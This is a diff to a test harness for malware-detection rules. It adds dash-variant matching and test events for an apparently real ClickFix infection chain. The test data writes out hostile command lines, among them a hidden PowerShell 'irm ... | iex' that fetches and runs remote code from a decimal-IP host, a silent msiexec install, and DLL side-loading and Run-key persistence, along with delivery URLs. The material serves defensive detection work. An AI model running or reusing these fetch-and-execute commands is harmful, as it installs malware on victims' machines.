@@ -30,7 +30,11 @@ def sel(s, ev):
                 return False
             continue
         val = str(ev.get(f, '')).lower()
-        hits = [FN[mod](val, str(x).lower()) for x in (v if isinstance(v, list) else [v])]
+        vals = [str(x).lower() for x in (v if isinstance(v, list) else [v])]
+        if 'windash' in (mod + '|' + quant).split('|'):  # '-' may also be written '/' (en/em dashes are not generated here)
+            vals = vals + [x.replace('-', '/') for x in vals]
+            quant = quant.replace('windash', '')
+        hits = [FN[mod](val, x) for x in vals]
         if not (all(hits) if quant == 'all' else any(hits)):
             return False
     return True
@@ -113,6 +117,26 @@ T = [
     ('proc_creation_win_malware_fluxengine_renamed_autoit_root_folder.yml', dict(OriginalFileName='AutoIt3.exe', Image='C:\\Program Files\\AutoIt3\\AutoIt3.exe', CommandLine='"C:\\Program Files\\AutoIt3\\AutoIt3.exe" C:\\scripts\\job.au3'), False, 'installed AutoIt3'),
     ('proc_creation_win_malware_fluxengine_wscript_regsvr32_temp_sct.yml', dict(ParentImage='C:\\Windows\\System32\\wscript.exe', Image='C:\\Windows\\System32\\regsvr32.exe', CommandLine='regsvr32 /s /n /u /i:"C:\\Users\\a\\AppData\\Local\\Temp\\t481799.sct" scrobj.dll'), True, 'VBS starts stage 2'),
     ('proc_creation_win_malware_fluxengine_wscript_regsvr32_temp_sct.yml', dict(ParentImage='C:\\Windows\\System32\\wscript.exe', Image='C:\\Windows\\System32\\regsvr32.exe', CommandLine='regsvr32 /s C:\\Tools\\x.dll'), False, 'script registers a DLL'),
+    # ROMULUS ClickFix chain (2026-11 case)
+    ('proc_creation_win_powershell_download_decimal_dword_ip.yml', dict(Image='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', CommandLine='powershell -w hidden -c "irm http://1450003207/s/3af981719677|iex"'), True, 'irm decimal DWORD host'),
+    ('proc_creation_win_powershell_download_decimal_dword_ip.yml', dict(Image='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', CommandLine='powershell iwr http://1450003207:8080/a.msi -OutFile a.msi'), True, 'iwr decimal host with port'),
+    ('proc_creation_win_powershell_download_decimal_dword_ip.yml', dict(Image='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', CommandLine='powershell irm http://86.109.75.7/x'), False, 'dotted IP is another rule'),
+    ('proc_creation_win_powershell_download_decimal_dword_ip.yml', dict(Image='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', CommandLine='powershell irm http://12345678.example.com/x'), False, 'numeric label followed by a dot'),
+    ('proc_creation_win_powershell_download_decimal_dword_ip.yml', dict(Image='C:\\Windows\\System32\\cmd.exe', CommandLine='cmd /c curl http://1450003207/x'), False, 'not PowerShell'),
+    ('proc_creation_win_malware_romulus_msiexec_hex_temp_msi.yml', dict(ParentImage='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', Image='C:\\Windows\\System32\\msiexec.exe', CommandLine='msiexec.exe /i C:\\Users\\a\\AppData\\Local\\Temp\\0a1b2c3d4e5f60718293a4b5c6d7e8f9_ISOSimple.msi /qn /norestart'), True, 'PowerShell msiexec hex-named temp MSI'),
+    ('proc_creation_win_malware_romulus_msiexec_hex_temp_msi.yml', dict(ParentImage='C:\\Windows\\explorer.exe', Image='C:\\Windows\\System32\\msiexec.exe', CommandLine='msiexec.exe /i C:\\Users\\a\\AppData\\Local\\Temp\\0a1b2c3d4e5f60718293a4b5c6d7e8f9_ISOSimple.msi /qn'), False, 'parent is explorer'),
+    ('proc_creation_win_malware_romulus_msiexec_hex_temp_msi.yml', dict(ParentImage='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', Image='C:\\Windows\\System32\\msiexec.exe', CommandLine='msiexec.exe /i C:\\Users\\a\\AppData\\Local\\Temp\\setup.msi /qn'), False, 'plain-named temp MSI'),
+    ('proc_creation_win_susp_stardock_deelevate_non_standard_location.yml', dict(Image='C:\\Users\\a\\AppData\\Local\\Programs\\Stardock Smart DeElevation Tool\\DeElevate64.exe'), True, 'host in user profile'),
+    ('proc_creation_win_susp_stardock_deelevate_non_standard_location.yml', dict(Image='C:\\Program Files (x86)\\Stardock\\Fences\\DeElevate64.exe'), False, 'genuine Fences install'),
+    ('image_load_side_load_stardock_deelevator64.yml', dict(Image='C:\\Users\\a\\AppData\\Local\\Programs\\Stardock Smart DeElevation Tool\\DeElevate64.exe', ImageLoaded='C:\\Users\\a\\AppData\\Local\\Programs\\Stardock Smart DeElevation Tool\\DeElevator64.dll'), True, 'DLL from user profile'),
+    ('image_load_side_load_stardock_deelevator64.yml', dict(Image='C:\\Program Files\\Stardock\\Start11\\DeElevate64.exe', ImageLoaded='C:\\Program Files\\Stardock\\Start11\\DeElevator64.dll'), False, 'genuine Start11'),
+    ('registry_set_malware_romulus_deelevate64_run_key.yml', dict(TargetObject='HKU\\S-1-5-21\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Stardock DeElevation Tool', Details='"C:\\Users\\a\\AppData\\Local\\Programs\\Stardock Smart DeElevation Tool\\DeElevate64.exe"'), True, 'Run value in user profile'),
+    ('registry_set_malware_romulus_deelevate64_run_key.yml', dict(TargetObject='HKU\\S-1-5-21\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Fences', Details='"C:\\Program Files (x86)\\Stardock\\Fences\\DeElevate64.exe"'), False, 'genuine install'),
+    ('proxy_malware_romulus_delivery_urls.yml', {'c-uri': 'http://1450003207/s/3af981719677'}, True, 'stager route, decimal host'),
+    ('proxy_malware_romulus_delivery_urls.yml', {'c-uri': 'http://23.94.145.243/app/3af981719677/IconEdit2Turb.msi'}, True, 'MSI route'),
+    ('proxy_malware_romulus_delivery_urls.yml', {'c-uri': 'http://91.92.43.239/e/3af981719677/0a1b2c3d4e5f60718293a4b5c6d7e8f9'}, True, 'encrypted route'),
+    ('proxy_malware_romulus_delivery_urls.yml', {'c-uri': 'http://example.com/app/readme.msi'}, False, 'ordinary msi download'),
+    ('proxy_malware_romulus_delivery_urls.yml', {'c-uri': 'http://example.com/s/shop'}, False, 'ordinary /s/ path'),
 ]
 for f, ev, exp, label in T:
     check(fires(load(f), ev) == exp, f'{f.split("_malware_")[-1] if "_malware_" in f else f}: {label} -> {"fire" if exp else "silent"}')
